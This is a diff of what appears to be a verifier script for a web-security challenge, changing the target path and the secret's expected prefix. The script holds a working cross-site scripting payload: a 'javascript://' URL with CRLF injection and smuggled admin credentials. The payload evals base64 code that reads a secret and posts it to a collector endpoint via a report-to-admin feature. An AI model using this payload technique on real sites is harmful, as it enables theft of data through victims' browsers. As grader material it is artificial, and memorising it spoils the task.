@@ -91,7 +91,7 @@ function checkIndirection(expected) {
 }
 
 async function recoverThroughApp() {
-  const js = "fetch('/flag').then(r=>r.text()).then(t=>fetch('/collect',{method:'POST',headers:{'Content-Type':'text/plain'},body:t}))";
+  const js = "fetch('/review/value').then(r=>r.text()).then(t=>fetch('/collect',{method:'POST',headers:{'Content-Type':'text/plain'},body:t}))";
   const encoded = Buffer.from(js).toString('base64');
   const payload = `javascript://admin.pk/;%250D%250A;eval(atob('${encoded}'))\",\"username\":\"admin\",\"pass\":\"P@ss`;
   await request('POST', '/report', {
@@ -103,7 +103,7 @@ async function recoverThroughApp() {
     await new Promise((resolve) => setTimeout(resolve, 1000));
     const res = await request('GET', '/collect');
     const items = JSON.parse(res.body).items || [];
-    const found = items.map((item) => item.value).find((value) => typeof value === 'string' && value.startsWith('NBL-'));
+    const found = items.map((item) => item.value).find((value) => typeof value === 'string' && value.startsWith('HSS-'));
     if (found) return found;
   }
   throw new Error('verifier could not recover value through application workflow');
@@ -112,7 +112,7 @@ async function recoverThroughApp() {
 async function main() {
   await waitForService();
   const expected = await recoverThroughApp();
-  if (!expected.startsWith('NBL-')) throw new Error('unexpected value prefix');
+  if (!expected.startsWith('HSS-')) throw new Error('unexpected value prefix');
   checkIndirection(expected);
   const actual = readRegular();
   if (actual !== expected) throw new Error('recovered value mismatch');
